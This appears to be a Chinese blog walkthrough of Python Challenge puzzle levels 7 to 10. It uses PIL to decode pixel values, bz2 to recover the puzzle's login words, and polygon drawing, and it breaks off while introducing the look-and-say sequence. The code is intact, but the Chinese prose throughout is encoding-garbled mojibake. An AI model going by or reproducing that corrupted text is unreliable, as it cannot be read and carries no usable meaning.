<p>ç¬¬ä¸€æ­¥ï¼Œå…ˆå°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = requests.get(img_url)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(img.content)</span><br></pre></td></tr></table></figure></p>
<p>ç¬¬äºŒæ­¥ï¼ŒæŸ¥çœ‹å›¾ç‰‡çš„å¿…è¦ä¿¡æ¯ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.<span class="built_in">format</span>, img.size, img.mode)</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœæ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG (629, 95) RGBA # åˆ†åˆ«æ˜¯åç¼€ï¼Œï¼ˆå®½ï¼Œé«˜ï¼‰ï¼Œ æ¨¡å¼</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°å›¾åƒçš„æ¨¡å¼æ˜¯ RGBA çš„ï¼Œé‚£ä¹ˆæ¯ä¸ªåƒç´ ç‚¹å°±æ˜¯ä¸ªå››å…ƒç»„ï¼Œåˆ†åˆ«ä¸º <code>r, g, b, a</code> å‰ä¸‰ä¸ªä¸ºçº¢ï¼Œç»¿ï¼Œé»„ï¼Œæœ€åä¸€ä¸ªä¸ºé€æ˜åº¦ï¼ˆæœ¬é¢˜ç”¨ä¸ç€ï¼‰ã€‚éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼š<strong>ç°åº¦å›¾åƒçš„ r == g == b</strong>ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ç‚¹ï¼Œå…ˆæ‰¾åˆ°å›¾ç‰‡ä¸­çš„ç°åº¦æ¡åœ¨å“ªå‡ è¡Œã€‚ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((<span class="number">0</span>, x)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.height)]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">    <span class="keyword">if</span> row[i][<span class="number">0</span>] == row[i][<span class="number">1</span>] == row[i][<span class="number">2</span>]:  <span class="comment"># r == g == b</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d:&quot;</span> % i, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122229.png" /></p>
<p>éšä¾¿å–ä¸€è¡Œå³å¯ï¼Œè¿™é‡Œå– 47ï¼Œå› ä¸º <code>img.height / 2</code> çš„å€¼ä¸º 47ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼Œå–å‡º 47 è¡Œçš„æ‰€æœ‰åƒç´ ç‚¹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122525.png" /></p>
<p>å‘ç°ï¼Œé™¤äº†ç¬¬ä¸€ä¸ªä¹‹å¤–ï¼Œå…¶ä½™çš„åƒç´ ç‚¹éƒ½é‡å¤äº† 7 æ¬¡ï¼Œå› æ­¤æˆ‘ä»¬å‰”é™¤é‡å¤çš„ï¼šï¼ˆä¸Šé¢çš„ä»£ç ç¨ä½œä¿®æ”¹ï¼‰ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>): <span class="comment"># ä¿®æ”¹äº†è¿™é‡Œ</span></span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122931.png" /></p>
<p>ç¬¬å››æ­¥ï¼Œæ¯ä¸ªç°åº¦å›¾åƒéƒ½æœ‰ä¸€ä¸ªç°åº¦å€¼ï¼Œå› æ­¤åšä¸€ä¸ªçŒœæµ‹ï¼š<strong>å°†è¿™äº›ç°åº¦å€¼å½“ä½œ ascii ç ï¼Œç„¶åè½¬ä¸ºå­—ç¬¦ã€‚</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(info))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smart guy, you made it. the next level is [105, 110, 116, 101, 103, 114, 105, 116, 121]pe_ </span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>åè¾¹çš„ pe_ æˆ‘çŒœæµ‹æ˜¯å› ä¸ºç¬¬ä¸€ä¸ªåƒç´ ç‚¹å°±é‡å¤äº†5æ¬¡ï¼Œè€Œæˆ‘å–æ­¥é•¿ä¸º7ï¼Œå¯¼è‡´æ¯æ¬¡å–å¾—éƒ½ä¸æ˜¯é‡å¤å€¼é‡Œé¢å¾—ç¬¬ä¸€ä¸ªï¼Œå› ä¸ºå¯èƒ½å°†é‡å¤å€¼åé¢å¾—æ— å…³çš„ä¹Ÿå–äº†è¿›æ¥ã€‚</p>
</blockquote>
<p>å°†ä¸Šé¢ç»“æœä¸­å¾—æ•°å­—ä¹Ÿæå–å‡ºæ¥ï¼Œå½“ä½œ ascii ç å¤„ç†ï¼Œå› æ­¤æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line">message = <span class="string">&quot;&quot;</span>.join(info)  </span><br><span class="line"><span class="built_in">next</span> = re.findall(<span class="string">r&#x27;(\d+)&#x27;</span>, message)  </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">next</span>:  </span><br><span class="line">    v = <span class="built_in">int</span>(c)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">integrity</span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/def/oxygen.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/def/integrity.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-8">level 8</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-8">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221330.png" /></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221350.png" /></p>
<p>å‘ç°ï¼š</p>
<ol type="1">
<li>å›¾ç‰‡ä¸­çš„èœœèœ‚å¯ä»¥ç‚¹å¼€ï¼Œç‚¹å¼€ä¹‹åä¼šè·³å‡ºä¸€ä¸ªéªŒè¯ç•Œé¢ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221552.png" /></li>
<li>ç»¿è‰²å­—ç¬¦ä¸²æ­£å¥½å¯¹åº”çš„ç”¨æˆ·åå’Œå¯†ç </li>
</ol>
<p>ä½†æ˜¯ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºåº”è¯¥æ˜¯ç»è¿‡æŸç§ç¼–ç çš„ï¼Œåæ¥å‘ç°ï¼Œæ˜¯é€šè¿‡ <strong>bz2</strong> å‹ç¼©å¾—åˆ°çš„ã€‚è€Œ python è‡ªå¸¦äº† <strong>bz2</strong> åº“ã€‚</p>
<h2 id="æ–¹æ³•-10">æ–¹æ³•</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bz2  </span><br><span class="line">un = <span class="string">b&#x27;BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084&#x27;</span>  </span><br><span class="line">pw = <span class="string">b&#x27;BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(bz2.decompress(un), bz2.decompress(pw))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;huge&#x27; b&#x27;file&#x27;</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·åï¼šhuge</span><br><span class="line">å¯†ç ï¼šfile</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åæˆåŠŸç™»å½•ï¼Œå¾—åˆ°æ–°çš„ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/good.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-9">level 9</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-9">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230807.png" /></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230823.png" /></p>
<p>æœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯å°†å›¾ä¸­çš„é»‘ç‚¹è¿èµ·æ¥ï¼Œåæ¥æƒ³æƒ³åº”è¯¥ä¸å¤ªå¯èƒ½ï¼Œç„¶åæ³¨æ„åˆ° <code>first + second</code> ï¼Œä½†æ˜¯ first å’Œ second çš„é•¿åº¦éƒ½ä¸åŒï¼Œæ— æ³•ç›¸åŠ ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯ç®€å•çš„ç›¸åŠ ã€‚è”æƒ³åˆ° <code>connect the dots</code> è§‰å¾—åº”è¯¥æ˜¯å°† first å’Œ second è¿æ¥èµ·æ¥ï¼Œé‚£ä¹ˆ first å’Œ second ä»£è¡¨çš„å°±æ˜¯ç‚¹çš„åæ ‡ã€‚</p>
<h2 id="æ–¹æ³•-11">æ–¹æ³•</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">first = [<span class="number">146</span>,<span class="number">399</span>,<span class="number">163</span>,<span class="number">403</span>,<span class="number">170</span>,<span class="number">393</span>,<span class="number">169</span>,<span class="number">391</span>,<span class="number">166</span>,<span class="number">386</span>,<span class="number">170</span>,<span class="number">381</span>,<span class="number">170</span>,<span class="number">371</span>,<span class="number">170</span>,<span class="number">355</span>,<span class="number">169</span>,<span class="number">346</span>,<span class="number">167</span>,<span class="number">335</span>,<span class="number">170</span>,<span class="number">329</span>,<span class="number">170</span>,<span class="number">320</span>,<span class="number">170</span>,<span class="number">310</span>,<span class="number">171</span>,<span class="number">301</span>,<span class="number">173</span>,<span class="number">290</span>,<span class="number">178</span>,<span class="number">289</span>,<span class="number">182</span>,<span class="number">287</span>,<span class="number">188</span>,<span class="number">286</span>,<span class="number">190</span>,<span class="number">286</span>,<span class="number">192</span>,<span class="number">291</span>,<span class="number">194</span>,<span class="number">296</span>,<span class="number">195</span>,<span class="number">305</span>,<span class="number">194</span>,<span class="number">307</span>,<span class="number">191</span>,<span class="number">312</span>,<span class="number">190</span>,<span class="number">316</span>,<span class="number">190</span>,<span class="number">321</span>,<span class="number">192</span>,<span class="number">331</span>,<span class="number">193</span>,<span class="number">338</span>,<span class="number">196</span>,<span class="number">341</span>,<span class="number">197</span>,<span class="number">346</span>,<span class="number">199</span>,<span class="number">352</span>,<span class="number">198</span>,<span class="number">360</span>,<span class="number">197</span>,<span class="number">366</span>,<span class="number">197</span>,<span class="number">373</span>,<span class="number">196</span>,<span class="number">380</span>,<span class="number">197</span>,<span class="number">383</span>,<span class="number">196</span>,<span class="number">387</span>,<span class="number">192</span>,<span class="number">389</span>,<span class="number">191</span>,<span class="number">392</span>,<span class="number">190</span>,<span class="number">396</span>,<span class="number">189</span>,<span class="number">400</span>,<span class="number">194</span>,<span class="number">401</span>,<span class="number">201</span>,<span class="number">402</span>,<span class="number">208</span>,<span class="number">403</span>,<span class="number">213</span>,<span class="number">402</span>,<span class="number">216</span>,<span class="number">401</span>,<span class="number">219</span>,<span class="number">397</span>,<span class="number">219</span>,<span class="number">393</span>,<span class="number">216</span>,<span class="number">390</span>,<span class="number">215</span>,<span class="number">385</span>,<span class="number">215</span>,<span class="number">379</span>,<span class="number">213</span>,<span class="number">373</span>,<span class="number">213</span>,<span class="number">365</span>,<span class="number">212</span>,<span class="number">360</span>,<span class="number">210</span>,<span class="number">353</span>,<span class="number">210</span>,<span class="number">347</span>,<span class="number">212</span>,<span class="number">338</span>,<span class="number">213</span>,<span class="number">329</span>,<span class="number">214</span>,<span class="number">319</span>,<span class="number">215</span>,<span class="number">311</span>,<span class="number">215</span>,<span class="number">306</span>,<span class="number">216</span>,<span class="number">296</span>,<span class="number">218</span>,<span class="number">290</span>,<span class="number">221</span>,<span class="number">283</span>,<span class="number">225</span>,<span class="number">282</span>,<span class="number">233</span>,<span class="number">284</span>,<span class="number">238</span>,<span class="number">287</span>,<span class="number">243</span>,<span class="number">290</span>,<span class="number">250</span>,<span class="number">291</span>,<span class="number">255</span>,<span class="number">294</span>,<span class="number">261</span>,<span class="number">293</span>,<span class="number">265</span>,<span class="number">291</span>,<span class="number">271</span>,<span class="number">291</span>,<span class="number">273</span>,<span class="number">289</span>,<span class="number">278</span>,<span class="number">287</span>,<span class="number">279</span>,<span class="number">285</span>,<span class="number">281</span>,<span class="number">280</span>,<span class="number">284</span>,<span class="number">278</span>,<span class="number">284</span>,<span class="number">276</span>,<span class="number">287</span>,<span class="number">277</span>,<span class="number">289</span>,<span class="number">283</span>,<span class="number">291</span>,<span class="number">286</span>,<span class="number">294</span>,<span class="number">291</span>,<span class="number">296</span>,<span class="number">295</span>,<span class="number">299</span>,<span class="number">300</span>,<span class="number">301</span>,<span class="number">304</span>,<span class="number">304</span>,<span class="number">320</span>,<span class="number">305</span>,<span class="number">327</span>,<span class="number">306</span>,<span class="number">332</span>,<span class="number">307</span>,<span class="number">341</span>,<span class="number">306</span>,<span class="number">349</span>,<span class="number">303</span>,<span class="number">354</span>,<span class="number">301</span>,<span class="number">364</span>,<span class="number">301</span>,<span class="number">371</span>,<span class="number">297</span>,<span class="number">375</span>,<span class="number">292</span>,<span class="number">384</span>,<span class="number">291</span>,<span class="number">386</span>,<span class="number">302</span>,<span class="number">393</span>,<span class="number">324</span>,<span class="number">391</span>,<span class="number">333</span>,<span class="number">387</span>,<span class="number">328</span>,<span class="number">375</span>,<span class="number">329</span>,<span class="number">367</span>,<span class="number">329</span>,<span class="number">353</span>,<span class="number">330</span>,<span class="number">341</span>,<span class="number">331</span>,<span class="number">328</span>,<span class="number">336</span>,<span class="number">319</span>,<span class="number">338</span>,<span class="number">310</span>,<span class="number">341</span>,<span class="number">304</span>,<span class="number">341</span>,<span class="number">285</span>,<span class="number">341</span>,<span class="number">278</span>,<span class="number">343</span>,<span class="number">269</span>,<span class="number">344</span>,<span class="number">262</span>,<span class="number">346</span>,<span class="number">259</span>,<span class="number">346</span>,<span class="number">251</span>,<span class="number">349</span>,<span class="number">259</span>,<span class="number">349</span>,<span class="number">264</span>,<span class="number">349</span>,<span class="number">273</span>,<span class="number">349</span>,<span class="number">280</span>,<span class="number">349</span>,<span class="number">288</span>,<span class="number">349</span>,<span class="number">295</span>,<span class="number">349</span>,<span class="number">298</span>,<span class="number">354</span>,<span class="number">293</span>,<span class="number">356</span>,<span class="number">286</span>,<span class="number">354</span>,<span class="number">279</span>,<span class="number">352</span>,<span class="number">268</span>,<span class="number">352</span>,<span class="number">257</span>,<span class="number">351</span>,<span class="number">249</span>,<span class="number">350</span>,<span class="number">234</span>,<span class="number">351</span>,<span class="number">211</span>,<span class="number">352</span>,<span class="number">197</span>,<span class="number">354</span>,<span class="number">185</span>,<span class="number">353</span>,<span class="number">171</span>,<span class="number">351</span>,<span class="number">154</span>,<span class="number">348</span>,<span class="number">147</span>,<span class="number">342</span>,<span class="number">137</span>,<span class="number">339</span>,<span class="number">132</span>,<span class="number">330</span>,<span class="number">122</span>,<span class="number">327</span>,<span class="number">120</span>,<span class="number">314</span>,<span class="number">116</span>,<span class="number">304</span>,<span class="number">117</span>,<span class="number">293</span>,<span class="number">118</span>,<span class="number">284</span>,<span class="number">118</span>,<span class="number">281</span>,<span class="number">122</span>,<span class="number">275</span>,<span class="number">128</span>,<span class="number">265</span>,<span class="number">129</span>,<span class="number">257</span>,<span class="number">131</span>,<span class="number">244</span>,<span class="number">133</span>,<span class="number">239</span>,<span class="number">134</span>,<span class="number">228</span>,<span class="number">136</span>,<span class="number">221</span>,<span class="number">137</span>,<span class="number">214</span>,<span class="number">138</span>,<span class="number">209</span>,<span class="number">135</span>,<span class="number">201</span>,<span class="number">132</span>,<span class="number">192</span>,<span class="number">130</span>,<span class="number">184</span>,<span class="number">131</span>,<span class="number">175</span>,<span class="number">129</span>,<span class="number">170</span>,<span class="number">131</span>,<span class="number">159</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">134</span>,<span class="number">160</span>,<span class="number">130</span>,<span class="number">170</span>,<span class="number">125</span>,<span class="number">176</span>,<span class="number">114</span>,<span class="number">176</span>,<span class="number">102</span>,<span class="number">173</span>,<span class="number">103</span>,<span class="number">172</span>,<span class="number">108</span>,<span class="number">171</span>,<span class="number">111</span>,<span class="number">163</span>,<span class="number">115</span>,<span class="number">156</span>,<span class="number">116</span>,<span class="number">149</span>,<span class="number">117</span>,<span class="number">142</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">129</span>,<span class="number">115</span>,<span class="number">124</span>,<span class="number">115</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">120</span>,<span class="number">109</span>,<span class="number">122</span>,<span class="number">102</span>,<span class="number">122</span>,<span class="number">100</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">89</span>,<span class="number">115</span>,<span class="number">87</span>,<span class="number">110</span>,<span class="number">82</span>,<span class="number">109</span>,<span class="number">84</span>,<span class="number">118</span>,<span class="number">89</span>,<span class="number">123</span>,<span class="number">93</span>,<span class="number">129</span>,<span class="number">100</span>,<span class="number">130</span>,<span class="number">108</span>,<span class="number">132</span>,<span class="number">110</span>,<span class="number">133</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">107</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">140</span>,<span class="number">95</span>,<span class="number">138</span>,<span class="number">86</span>,<span class="number">141</span>,<span class="number">79</span>,<span class="number">149</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">90</span>,<span class="number">165</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">109</span>,<span class="number">171</span>,<span class="number">107</span>,<span class="number">161</span>,<span class="number">111</span>,<span class="number">156</span>,<span class="number">113</span>,<span class="number">170</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">118</span>,<span class="number">208</span>,<span class="number">117</span>,<span class="number">223</span>,<span class="number">121</span>,<span class="number">239</span>,<span class="number">128</span>,<span class="number">251</span>,<span class="number">133</span>,<span class="number">259</span>,<span class="number">136</span>,<span class="number">266</span>,<span class="number">139</span>,<span class="number">276</span>,<span class="number">143</span>,<span class="number">290</span>,<span class="number">148</span>,<span class="number">310</span>,<span class="number">151</span>,<span class="number">332</span>,<span class="number">155</span>,<span class="number">348</span>,<span class="number">156</span>,<span class="number">353</span>,<span class="number">153</span>,<span class="number">366</span>,<span class="number">149</span>,<span class="number">379</span>,<span class="number">147</span>,<span class="number">394</span>,<span class="number">146</span>,<span class="number">399</span>]  </span><br><span class="line">second = [<span class="number">156</span>,<span class="number">141</span>,<span class="number">165</span>,<span class="number">135</span>,<span class="number">169</span>,<span class="number">131</span>,<span class="number">176</span>,<span class="number">130</span>,<span class="number">187</span>,<span class="number">134</span>,<span class="number">191</span>,<span class="number">140</span>,<span class="number">191</span>,<span class="number">146</span>,<span class="number">186</span>,<span class="number">150</span>,<span class="number">179</span>,<span class="number">155</span>,<span class="number">175</span>,<span class="number">157</span>,<span class="number">168</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">157</span>,<span class="number">159</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">164</span>,<span class="number">159</span>,<span class="number">175</span>,<span class="number">159</span>,<span class="number">181</span>,<span class="number">157</span>,<span class="number">191</span>,<span class="number">154</span>,<span class="number">197</span>,<span class="number">153</span>,<span class="number">205</span>,<span class="number">153</span>,<span class="number">210</span>,<span class="number">152</span>,<span class="number">212</span>,<span class="number">147</span>,<span class="number">215</span>,<span class="number">146</span>,<span class="number">218</span>,<span class="number">143</span>,<span class="number">220</span>,<span class="number">132</span>,<span class="number">220</span>,<span class="number">125</span>,<span class="number">217</span>,<span class="number">119</span>,<span class="number">209</span>,<span class="number">116</span>,<span class="number">196</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">114</span>,<span class="number">172</span>,<span class="number">114</span>,<span class="number">167</span>,<span class="number">112</span>,<span class="number">161</span>,<span class="number">109</span>,<span class="number">165</span>,<span class="number">107</span>,<span class="number">170</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">89</span>,<span class="number">164</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">148</span>,<span class="number">87</span>,<span class="number">140</span>,<span class="number">96</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">141</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">111</span>,<span class="number">126</span>,<span class="number">113</span>,<span class="number">129</span>,<span class="number">118</span>,<span class="number">117</span>,<span class="number">128</span>,<span class="number">114</span>,<span class="number">137</span>,<span class="number">115</span>,<span class="number">146</span>,<span class="number">114</span>,<span class="number">155</span>,<span class="number">115</span>,<span class="number">158</span>,<span class="number">121</span>,<span class="number">157</span>,<span class="number">128</span>,<span class="number">156</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">136</span>,<span class="number">156</span>,<span class="number">136</span>]  </span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">500</span>, <span class="number">500</span>))  </span><br><span class="line">draw = ImageDraw.Draw(img)  </span><br><span class="line">draw.polygon(first, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">draw.polygon(second, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœæ˜¯ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231228.png" /></p>
<p>ç‰›çš„è‹±æ–‡æ˜¯ cowï¼Œä¿®æ”¹ url ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/cow.html</span><br></pre></td></tr></table></figure>
<p>æç¤ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hmm. it&#x27;s a male.</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå°±æ˜¯å…¬ç‰›ï¼Œè‹±è¯­ä¸º bullã€‚ä¿®æ”¹ url ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/cow.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/bull.html</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>å¦‚æœå‡ºç°éªŒè¯çš„æ¡†ï¼Œè¾“å…¥ level 8 å¾—åˆ°çš„ç”¨æˆ·åå’Œå¯†ç å³å¯ã€‚</p>
</blockquote>
<p>å…¶å®ï¼Œåªæœ‰ first ä¹Ÿèƒ½ç”»å‡ºè¿™å¤´ç‰›ï¼Œè€Œ second ç”»å‡ºæ¥çš„é•¿è¿™æ ·ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231802.png" /></p>
<p>ä¸çŸ¥é“æ˜¯å¦å¯ä»¥ç†è§£ä¸º <strong>æ€§å™¨å®˜ï¼Ÿï¼Ÿï¼Ÿ</strong></p>
<h1 id="level-10">level 10</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-10">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202104810.png" /></p>
<p>æ³¨æ„åˆ° <code>len(a[30]) = ?</code>ã€‚æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°å›¾ç‰‡ä¸­çš„ç‰›å¯ä»¥ç‚¹å‡»ï¼Œå¹¶ä¸”å¾—åˆ°ä¸€ä¸ªæ•°ç»„ aï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = [1, 11, 21, 1211, 111221,</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡è§‚å¯Ÿï¼Œå‘ç°è¿™ä¸ªæ•°ç»„å¹¶æ²¡æœ‰é—­åˆã€‚é‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š<strong>é€šè¿‡æ•°ç»„çš„æŸç§è§„å¾‹å¾—åˆ° a[30] çš„å€¼ï¼Œç„¶åå†è®¡ç®—é•¿åº¦ã€‚</strong></p>
<p>é€šè¿‡æŸ¥èµ„æ–™å‘ç°ï¼Œè¿™æ˜¯å¤–è§‚åºåˆ—ã€‚</p>
<blockquote>
